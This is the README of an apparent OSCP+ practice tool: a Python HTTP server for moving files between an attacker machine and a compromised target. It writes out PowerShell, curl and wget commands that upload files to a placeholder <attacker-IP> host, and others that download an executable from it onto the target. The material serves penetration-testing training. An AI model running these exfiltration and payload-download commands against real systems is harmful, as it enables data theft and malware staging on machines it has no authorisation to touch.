# OSCP-Plus-Prep

## Simple File Transfer Server

This is a lightweight Python HTTP server designed for quick and easy file transfers between machines. It is particularly useful in penetration testing scenarios, such as the OSCP+ exam, where transferring files between an attacker's machine and a compromised target is necessary.

### Features

- Supports both **file upload (PUT request)** and **file download (GET request)**.
- Works on **Windows, Linux, and macOS**.
- Requires **no dependencies** beyond Python's standard library.
- Custom **colored output** for better visibility.

---

## How to Use

### 1. Starting the Server

To start the server, run the following command on your attacker machine:

```bash
python3 simple_server.py 8080
```

By default, the server runs on port `80`, but you can specify any available port, such as `8080`.

---

## Transferring Files

### Uploading Files to the Attacker Machine

#### **From a Windows Target (Using PowerShell)**

To upload a file from a Windows target to your attacker's machine:

```powershell
Invoke-WebRequest -Uri "http://<attacker-IP>:8080/file.txt" -InFile "C:\Users\Documents\file.txt" -Method Put
```

#### **From a Linux Target**

Using `curl` (recommended):

```bash
curl -T file.tar.gz http://<attacker-IP>/file.tar.gz
```

Using `wget`:

```bash
wget --method=PUT --body-file=file.tar.gz http://<attacker-IP>/file.tar.gz
```

---

### Downloading Files from the Attacker Machine

#### **From Any Target (Windows/Linux/macOS)**

To download a file from the attacker's machine to your target:

```bash
curl http://<attacker-IP>:8080/file.exe -o file.exe
```

This will save the `file.exe` file from the attacker's machine to the target.

If curl is not available on the system, you can use wget to download files as well:

```bash
wget http://<attacker-IP>:8080/file.exe -O file.exe
```

---

## Author

**Created by:** `glitcher`
